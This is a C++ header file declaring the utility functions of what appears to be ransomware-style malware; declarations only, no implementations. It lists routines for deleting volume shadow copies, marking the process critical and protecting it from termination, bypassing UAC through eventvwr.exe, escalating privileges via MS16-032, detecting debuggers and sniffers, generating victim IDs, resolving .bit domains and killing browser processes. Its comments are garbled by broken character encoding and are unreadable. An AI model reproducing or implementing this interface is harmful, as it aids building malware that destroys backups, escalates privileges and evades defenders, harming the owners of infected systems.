#pragma once
#include <Windows.h>
#include <ShObjIdl.h>
#include <ShlGuid.h>
#include <vss.h>
#include <vswriter.h>
#include <vsbackup.h>
#include <WinDNS.h>
#include <Sddl.h>
#include <LM.h>
#include "Mem.h"
#include "Api.h"

#define MAX_NETWORKS 150 // ������������ ���-�� ����� �� ��
#define SHOW_DBG 1 // ���������� ������ ������ �������


namespace Dbg
{
	 // ���������� ���������� � �������. ��������� ��� � printf.
	 void print(char *str, ...);
	 // ���������� ���������� � ����.
	 void writeToFile(char *fileName, void* data, DWORD length);
	 // ��� ������ ���������� � � ��������.
	 LPSTR formatMsg(int errCode);

	 int _getchar();
}


namespace Utils
{
	//// https://www.nirsoft.net/kernel_struct/vista/PEB.html
	//// http://hex.pp.ua/nt/LDR_MODULE.php


	// �������� ����� kernel32 ����� peb.
	HMODULE getKernel32();
	// �������� ����� ntdll ����� peb.
	HMODULE getNtdll();
	// ������ GetModuleHandle(0) ����� peb.
	HMODULE getModuleHandle0();
	/*
	 �������� ����� ������� �� ������� ��������. �������� �� �����, �.�. ��������������, ��� ��� ��� ������� ����� ���������.
	 hModule = ���, �� ������� ������ �������
	 function = ��� �������
	*/
	BYTE* getProcAddress(HMODULE hModule, char* function);
	// �������� ��� ����� � �������. ���������� ������.
	char* GetDisks();
	/*
	 ������ ����� (.lnk). ���������� true, ���� �������.
	 link = ���� � ������
	 link_path = ���� � �����, �� ������� ����� ���������
	 description = �������� ������
	*/
	bool CreateLink(LPSTR link, LPSTR link_path, LPSTR description);
	/*
	 �������� ����, �� ������� ��������� �����.
	 LinkPath = ���� � ������
	 NewLink = ����, �� ������� ����� ��������� �����
	*/
	void ChangeLinkPath(LPSTR LinkPath, LPSTR NewLink);
	/*
	 ������� ��� ������� ����� � �������. ������� ����� ����. ���������� true, ���� ����������� �������. ���������� ������ �������
	 � ����������� �� �����������.
	*/
	bool DeleteVss();
	// ������ ������� �����������. ������� ����� ����. ������� ��������� ������ :)
	void SetCritical();
	// ������� ���� ������������ ��������. ������� ����� ����. ����� ��� ����������� ���������� ��, ����� ����� ����.
	void RemoveCritical();
	// ���������, ������������ �� ������� ���� �������� SE_DEBUG_PRIVILEGE. ���������� true, ���� ��.
	BOOL IsDebugger();
	// ���������, ������ �� �����-������ ������� � ������ ������. ������ �������� �� ����� ��������� ��������. ��������� ������.
	bool IsSniffer();
	/*
		������ �� ������� ���������� sddl_protection, ��� �������� � ������������ �� ���� ������ �������� �� ����� ��� ����������,
		�� ����� ������: �������� � �������. �� ������� ����� ����, �� ��� ���� ����� - ��� �����. �������� ������ � Windows Vista.
		���������� true, ���� �������.
	*/
	bool ProtectProcess();
	// �������� ip ��� ������� � .bit ������. ���������� ������ ip. ��������� .bit ����� ��� ��������.
	LPSTR GetBitDomen(LPSTR domen);
	// ������ GetLastError(). �������� �������� �� TEB: https://www.nirsoft.net/kernel_struct/vista/TEB.html .
	ULONG getLastError();
	/*
	 ��������� ��� ��������, ���� ������� �� ���� � C:\Windows. ���������� = "chrome.exe, "iexplore.exe", "firefox.exe",
	 ����� �� ��������� ���� - ��������� �� ���������� � ������, ��������� ��� �����, �.�. � ��� ����� ������ � appdata.
	*/
	void CloseProcesses(char* self);
	// ����� uac ����� eventvwr.exe. ������������� ������� ������� � ������� ������, ���� �� �����. ��������� ������.
	void UacBypass();
	// MS16-032
	void LPE();
	// ���������, ������� �� ������� ������� ��� �������.
	BOOL IsAdmin();
	// �������� ID ������. �� ������ ��������� ����� GUID. ��������� ������. �������� ��� ������������� �����, ��� ��������.
	LPSTR GetVictimId();
	// �������� ������� ����� � sql-�������. �������������� ����������� ��� � ���, ��������� ������.
	LPSTR GetCurTime();
	/*
		������������ ������ ��� �������� �� ������. �� ������ ������ ������������ ������ �����.
		���������� ������ ��������: https://www.ietf.org/rfc/rfc1738.txt
		������ ������� �������������, ��� ���������� �������� ����� ����� ������ ��������� case '������' ����� case '+'.
		� ��� �������������� �������, ��� ������� isalnum ���������� 0 (�� �����, �� ����� (������ ��������)).
	*/
	char *conv_url(char* str);
	// ���������, �������� �� �� 64-������. ���������� true, ���� ��.
	bool IsX64();
	// ������ ����������� ���������� �� ������ trump :)
	void* ReadInfo();
}

namespace Crypt
{
	char* base64_encode(const unsigned char *input, int length);
	char* base64_decode(const char *input, int length, int *outlen);
}